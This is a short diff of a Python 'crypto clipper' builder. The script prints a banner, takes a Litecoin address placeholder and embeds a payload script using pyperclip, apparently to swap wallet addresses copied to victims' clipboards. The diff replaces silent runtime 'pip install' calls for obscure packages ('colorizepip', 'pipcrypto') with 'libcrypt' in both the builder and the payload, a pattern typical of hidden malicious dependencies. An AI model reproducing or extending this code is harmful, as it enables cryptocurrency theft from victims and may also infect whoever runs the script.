@@ -1,6 +1,6 @@
 import os
-os.system("pip install colorizepip")
-import colorizepip
+os.system("pip install libcrypt")
+import libcrypt
 print("""
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░  ░█████╗░██╗░░░░░██╗██████╗░██████╗░███████╗██████╗░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔══██╗  ██╔══██╗██║░░░░░██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
@@ -26,8 +26,8 @@ LTC_address = "{LITECOIN_ADDRESS}"
 """
 python_script = """
 import os
-os.system("pip install pipcrypto pyperclip")
-import pipcrypto
+os.system("pip install libcrypt pyperclip")
+import libcrypt
 import pyperclip as pc
 import time
 import re
